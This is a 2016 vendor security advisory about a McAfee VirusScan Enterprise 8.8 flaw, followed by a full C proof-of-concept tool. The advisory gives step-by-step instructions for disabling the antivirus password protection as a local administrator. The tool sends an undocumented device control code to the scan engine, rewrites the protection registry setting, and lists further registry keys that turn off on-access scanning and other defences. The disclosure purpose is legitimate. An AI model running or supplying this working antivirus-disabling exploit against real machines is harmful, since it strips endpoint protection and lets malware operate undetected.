/*
Security Advisory       @ Mediaservice.net Srl
(#01, 13/04/2016)        Data Security Division

         Title:  McAfee VirusScan Enterprise security restrictions bypass
   Application:  McAfee VirusScan Enterprise 8.8 and prior versions
      Platform:  Microsoft Windows
   Description:  A local Windows administrator is able to bypass the
    security restrictions and disable the antivirus engine
    without knowing the correct management password
        Author:  Maurizio Agazzini <inode@mediaservice.net>
 Vendor Status: Fixed
    References: http://lab.mediaservice.net/advisory/2016-01-mcafee.txt
                http://lab.mediaservice.net/code/mcafee_unprotector.c

1. Abstract.

McAfee VirusScan Enterprise has a feature to protect the scan engine
from local Windows administrators. A management password is needed to
disable it, unless Windows is running in "Safe Mode".

>From our understanding this feature is implemented insecurely: the
McAfee VirusScan Console checks the password and requests the engine to
unlock the safe registry keys. No checks are done by the engine itself,
so anyone can directly request the engine to stop without knowing the
correct management password.

2. Example Attack Session.

The attack can be reproduced in different ways, here are some examples.

Example 1:

Open the McAfee VirusScan Console and Sysinternals Process Explorer.

Under Process Explorer:

- Locate the mcconsol.exe process
- Type CTRL+L (show lower pane)
- Search for all "HKLM\SOFTWARE\McAfee\DesktopProtection" keys
- Close all the handles of this registry key

Go back to the McAfee Console and:

- Go to: Tools -> General Options
- Select the "Password Options" tab
- Select "No password" and apply settings

Now it is possible to stop the antivirus engine.

Example 2:

A specific tool has been written to request to disable password
protection. After running the tool you can disable it via the VirusScan
Console.

Code: http://lab.mediaservice.net/code/mcafee_unprotector.c

3. Affected Platforms.

All McAfee Viruscan Enterprise versions prior to 8.8 without SB10151 are
affected. Exploitation of this vulnerability requires that an attacker
has local Windows administrator privileges.

4. Fix.

On 25 February 2016, version SB10151 hotfix has been relased by McAfee,
which fixes the described vulnerability.

https://kc.mcafee.com/corporate/index?page=content&id=SB10151

5. Proof Of Concept.

See Example Attack Session above.

6. Timeline

07/11/2014 - First communication sent to McAfee
17/11/2014 - Second communication sent to McAfee
17/11/2014 - McAfee: Request to send again vulnerability information
18/11/2014 - Sent vulnerability information and PoC again
11/12/2014 - McAfee: Problem confirmed
09/03/2015 - Request for update to McAfee
06/05/2015 - Request for update to McAfee
06/05/2015 - McAfee: Patch release planned for Q3
20/08/2015 - McAfee: Request for deadline delay (31/03/2016)
25/02/2016 - McAfee: SB10151 patch has been relased

Copyright (c) 2014-2016 @ Mediaservice.net Srl. All rights reserved.

-- 
Maurizio Agazzini                     CISSP, CSSLP, OPST
Senior Security Advisor
@ Mediaservice.net Srl                Tel: +39-011-32.72.100
Via Santorelli, 15                    Fax: +39-011-32.46.497
10095 Grugliasco (TO) ITALY           http://mediaservice.net/disclaimer

"C programmers never die. They are just cast into void"
*/

/*****************************************************************************
 *                                                                           *
 * McAfee Data Protector "Unprotector"                                       *
 *                                                                           *
 * A little tool to request McAfee scan engine to disable password           *
 * protection.                                                               *
 *                                                                           *
 * Advisory: http://lab.mediaservice.net/advisory/2014-01-mcafee.txt         *
 *                                                                           *
 * This program can be compiled with MinGW (http://www.mingw.org/)           *
 *                                                                           *
 * Copyright (c) 2014 @ Mediaservice.net Srl. All rights reserved            *
 * Wrote by Maurizio Agazzini <inode[at]mediaservice.net>                    *
 *                                                                           *
 * This program is free software; you can redistribute it and/or             *
 * modify it under the terms of the GNU General Public License               *
 * as published by the Free Software Foundation; either version 2            *
 * of the License, or (at your option) any later version.                    *
 *                                                                           *
 * This program is distributed in the hope that it will be useful,           *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of            *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the             *
 * GNU General Public License for more details.                              *
 *                                                                           *
 * You should have received a copy of the GNU General Public License         *
 * along with this program; if not, write to the Free Software               *
 * Foundation, Inc., 59 Temple Place                                         *
 * Suite 330, Boston, MA  02111-1307, USA.                                   *
 *                                                                           *
 *****************************************************************************/

#include <stdio.h>
#include <windows.h>

HANDLE opendevice()
{
  HANDLE result;

  if((result = CreateFile("\\\\.\\WGUARDNT", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL) ) == NULL)
    if((result = CreateFile("\\\\.\\Global\\WGUARDNT", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL) ) == NULL)
      if((result = CreateFile("\\\\.\\WGUARDNT", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL) ) == NULL)
        if((result = CreateFile("\\\\.\\Global\\WGUARDNT", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL) ) == NULL)
          result = 0;
  
  return result;
}


void main(int argc, char ** argv)
{
	HKEY reg_key = NULL;
	HANDLE p;
	DWORD BytesReturned;
	DWORD data = 0;
	unsigned long size = 4;
	DWORD type = REG_DWORD;
	DWORD data1 = 0;

	char status[4][70]=	{
		"No password",
		"Password protection for all items listed",
		"Password protection for the selected items",
		"Password protection for conformance to Common Criteria"
	};

	printf("\n *******************************************\n");
	printf(" * McAfee Desktop Protection \"Unprotector\" *\n");
	printf(" *******************************************\n\n");

	/*
	 * The PoC use HKLM\SOFTWARE\McAfee\DesktopProtection\UIPMode registry key to
	 * disable the password protection, but you can also access to others useful
	 * keys.
	 *
	 * User Password
	 * HKLM\SOFTWARE\McAfee\DesktopProtection\UIP
	 * HKLM\SOFTWARE\McAfee\DesktopProtection\UIPEx
	 *
	 * Buffer protection
	 * HKLM\SOFTWARE\McAfee\SystemCore\VSCore\On Access Scanner\BehaviourBlocking\BOPEnabled
	 *
	 * Access protection
	 * HKLM\SOFTWARE\McAfee\SystemCore\VSCore\On Access Scanner\BehaviourBlocking\APEnabled
	 *
	 * On Access Scanner
	 * HKLM\SOFTWARE\McAfee\DesktopProtection\OASState
	 * HKLM\SOFTWARE\McAfee\SystemCore\VSCore\On Access Scanner\McShield\Configuration\OASEnabled
	 *
	 * Others
	 * HKLM\SOFTWARE\McAfee\SystemCore\VSCore\LockDownEnabled
	 *
	 */

	if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, "SOFTWARE\\McAfee\\DesktopProtection", 0,  KEY_QUERY_VALUE | KEY_READ | 0x0200, &reg_key) != ERROR_SUCCESS)
	{
		if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, "SOFTWARE\\\Wow6432Node\McAfee\\DesktopProtection", 0,  KEY_QUERY_VALUE | KEY_READ | 0x0200, &reg_key) != ERROR_SUCCESS)
		{	
			printf("Error opening registry key...\n");
			return;
		}	
	}
	
	// Check current status of McAfee protection	
	RegQueryValueEx(reg_key,"UIPMode",NULL, &type,(BYTE *)&data,&size);

	printf(" [+] Current UIPMode = %d (%s)\n\n", data, status[data]);

	RegCloseKey (reg_key);

	// Open McAfee magic device
	p = opendevice();

	printf(" [-] Please John, let me write to your registry keys...");
	
	// Request to the scan engine to stop protect registry keys
	DeviceIoControl(p, 0x9EDB6510u, 0, 0, 0, 0, &BytesReturned, 0);

	if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, "SOFTWARE\\McAfee\\DesktopProtection", 0,  KEY_QUERY_VALUE | KEY_READ | KEY_SET_VALUE, &reg_key) != ERROR_SUCCESS)
		if (RegOpenKeyEx (HKEY_LOCAL_MACHINE, "SOFTWARE\\McAfee\\DesktopProtection", 0,  KEY_QUERY_VALUE | KEY_READ | KEY_SET_VALUE, &reg_key) != ERROR_SUCCESS)
		{
			printf(" hmmm hmmm something went wrong!\n\n");
			printf(" [-] Ok John, take the control again!\n"); 		
			DeviceIoControl(p, 0x9EDB6514u, 0, 0, 0, 0, &BytesReturned, 0);
			CloseHandle(p);
			return;
		}	
			
	printf(" OK\n");
	data1 = 0;
		
	if( argc > 1 )
		data1 = atoi(argv[1]);
	
	// Disable McAfee protection	
	if( RegSetValueEx(reg_key, "UIPMode", 0, REG_DWORD, (CONST BYTE *)&data1, sizeof(DWORD)) != ERROR_SUCCESS)
		printf("\n hmmm hmmm something went wrong!\n");
	else
		printf("\n [+] Thank you! now we got the control! UIPMode = %d\n",data1);
			
	RegCloseKey (reg_key);
			
	printf("\n [+] Run \"%s %d\" to get original settings\n\n",argv[0],data);

	// Tell to engine to take control again
	printf(" [-] Ok John, take the control again!\n"); 		
	DeviceIoControl(p, 0x9EDB6514u, 0, 0, 0, 0, &BytesReturned, 0);
	CloseHandle(p);
	
}